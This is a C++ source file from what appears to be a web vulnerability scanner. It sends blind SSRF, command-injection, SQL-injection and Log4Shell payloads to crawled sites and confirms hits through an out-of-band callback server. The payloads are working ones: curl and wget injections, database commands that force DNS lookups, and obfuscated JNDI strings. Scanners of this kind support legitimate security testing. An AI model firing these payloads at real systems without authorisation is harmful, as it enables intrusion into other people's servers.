/// @file scanners/oob_confirmed.cpp
/// @brief OOB-confirmed scanners with callback verification loop.
///        Upgrades blind findings to confirmed critical when OOB server
///        receives callbacks.
#include "scanner_base.hpp"
#include <chrono>
#include <thread>

namespace apex {
namespace {

/// Poll OOB server for callback confirmation.
bool poll_oob(HttpClient &http, const std::string &oob_server,
              const std::string &uid, int timeout_secs = 8) {
  std::string poll_url = oob_server + "/poll/" + uid;
  auto deadline = std::chrono::steady_clock::now() +
                  std::chrono::seconds(timeout_secs);

  while (std::chrono::steady_clock::now() < deadline) {
    auto resp = http.get(poll_url);
    if (resp.status_code == 200 && resp.body.find("true") != std::string::npos)
      return true;
    std::this_thread::sleep_for(std::chrono::seconds(1));
  }
  return false;
}

/// Generate a unique ID for OOB correlation.
std::string gen_uid() {
  auto now = std::chrono::system_clock::now().time_since_epoch();
  auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now).count();
  return "apex" + std::to_string(ms % 1000000000);
}

/// Blind SSRF with OOB confirmation.
/// Scanner implementation.
std::vector<Finding> scan_blind_ssrf_confirmed(const Config &cfg, HttpClient &http,
                                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob || crawl.urls.empty()) return findings;

  const std::vector<std::string> ssrf_params = {
      "url", "uri", "link", "src", "source", "fetch", "request",
      "proxy", "redirect", "image", "avatar", "webhook", "callback"};

  // Iterate over targets.
  for (const auto &url : crawl.urls) {
    for (const auto &p : crawl.params) {
      if (p.url != url) continue;
      bool is_ssrf = false;
      for (const auto &sp : ssrf_params) {
        if (p.name.find(sp) != std::string::npos) { is_ssrf = true; break; }
      }
      if (!is_ssrf) continue;

      std::string uid = gen_uid();
      std::string payload = cfg.oob_server + "/" + uid;
      std::string test_url = url + "?" + p.name + "=" + payload;
      http.get(test_url);

      std::this_thread::sleep_for(std::chrono::seconds(2));
      if (poll_oob(http, cfg.oob_server, uid)) {
        findings.push_back({"Blind SSRF (OOB Confirmed)", "critical", test_url,
                            "DNS/HTTP callback received — server made outbound request",
                            p.name, payload, ""});
      }
    }
  }
  return findings;
}

/// Blind CMDi with OOB confirmation.
/// Scanner implementation.
std::vector<Finding> scan_blind_cmdi_confirmed(const Config &cfg, HttpClient &http,
                                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob || crawl.urls.empty()) return findings;

  // Iterate over targets.
  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url, "cmd");
    for (const auto &[base, param] : targets) {
      std::string uid = gen_uid();
      std::string oob_url = cfg.oob_server + "/" + uid;

      const std::vector<std::string> payloads = {
          "; curl " + oob_url,
          "| curl " + oob_url,
          "$(curl " + oob_url + ")",
          "`curl " + oob_url + "`",
          "; wget " + oob_url,
      };

      for (const auto &payload : payloads)
        http.get(base + payload);

      std::this_thread::sleep_for(std::chrono::seconds(3));
      if (poll_oob(http, cfg.oob_server, uid)) {
        findings.push_back({"Blind Command Injection (OOB Confirmed)", "critical",
                            url, "Server executed injected command — callback received",
                            param, "", ""});
        break;
      }
    }
  }
  return findings;
}

/// Blind SQLi with OOB DNS confirmation.
/// Scanner implementation.
std::vector<Finding> scan_blind_sqli_confirmed(const Config &cfg, HttpClient &http,
                                               const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob || crawl.urls.empty()) return findings;

  std::string oob_host = cfg.oob_server;
  size_t s = oob_host.find("://");
  if (s != std::string::npos) oob_host = oob_host.substr(s + 3);
  size_t c = oob_host.find(':');
  if (c != std::string::npos) oob_host = oob_host.substr(0, c);

  // Iterate over targets.
  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url);
    for (const auto &[base, param] : targets) {
      std::string uid = gen_uid();
      std::string dns = uid + "." + oob_host;

      const std::vector<std::string> payloads = {
          "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'."+dns+"\\\\a'))-- -",
          "'; EXEC master..xp_dirtree '//"+dns+"/a'-- -",
          "'; COPY (SELECT '') TO PROGRAM 'nslookup "+dns+"'-- -",
          "' AND UTL_HTTP.REQUEST('http://"+dns+"/')='1",
      };

      for (const auto &payload : payloads)
        http.get(base + payload);

      std::this_thread::sleep_for(std::chrono::seconds(3));
      if (poll_oob(http, cfg.oob_server, uid)) {
        findings.push_back({"Blind SQL Injection (OOB DNS Confirmed)", "critical",
                            url, "Database executed DNS lookup — blind SQLi confirmed",
                            param, "", ""});
        break;
      }
    }
  }
  return findings;
}

/// Log4Shell with OOB confirmation.
/// Scanner implementation.
std::vector<Finding> scan_log4shell_confirmed(const Config &cfg, HttpClient &http,
                                              const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob || crawl.urls.empty()) return findings;

  std::string uid = gen_uid();
  std::string oob_url = cfg.oob_server + "/" + uid;

  const std::vector<std::string> payloads = {
      "${jndi:ldap://" + oob_url + "/}",
      "${${lower:j}ndi:ldap://" + oob_url + "/}",
      "${${::-j}${::-n}${::-d}${::-i}:ldap://" + oob_url + "/}",
  };

  const std::vector<std::string> headers = {
      "User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version", "Authorization"};

  size_t limit = std::min(crawl.urls.size(), size_t(15));
  for (size_t i = 0; i < limit; ++i) {
    for (const auto &payload : payloads) {
      std::vector<std::pair<std::string, std::string>> hdrs;
      for (const auto &h : headers) hdrs.push_back({h, payload});
      http.get(crawl.urls[i], hdrs);
      http.post(crawl.urls[i], payload, "text/plain");
    }
  }

  std::this_thread::sleep_for(std::chrono::seconds(4));
  if (poll_oob(http, cfg.oob_server, uid)) {
    findings.push_back({"Log4Shell RCE (CVE-2021-44228) — OOB Confirmed", "critical",
                        crawl.urls[0], "JNDI lookup reached attacker server — full RCE",
                        "", "", ""});
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_oob_confirmed_scanners() {
  return {
      {"Blind SSRF (Confirmed)", scan_blind_ssrf_confirmed},
      {"Blind CMDi (Confirmed)", scan_blind_cmdi_confirmed},
      {"Blind SQLi (Confirmed)", scan_blind_sqli_confirmed},
      {"Log4Shell (Confirmed)", scan_log4shell_confirmed},
  };
}

} // namespace apex
